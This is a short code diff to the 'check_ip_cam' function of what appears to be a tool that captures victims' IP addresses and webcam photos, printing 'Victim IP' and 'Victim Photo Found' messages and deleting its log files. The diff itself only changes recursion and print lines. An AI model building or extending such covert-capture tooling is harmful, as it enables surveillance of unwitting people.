@@ -26,13 +26,13 @@ def check_ip_cam():
                 print(colored(f"[*] Victim IP : {read_IP}", "red"))
                 ip_file.close()
                 os.system('del ipfile.txt')
-            return check_ip_cam()
+            check_ip_cam()
         if images_log.exists():
             print("\n")
             print(colored("[++] Victim Photo Found/Catpured ", 'green'))
-            print("\n")
+            print("")
             os.system('del images_log_info.log')
-            return check_ip_cam()
+            check_ip_cam()
 
 
 def php_data():
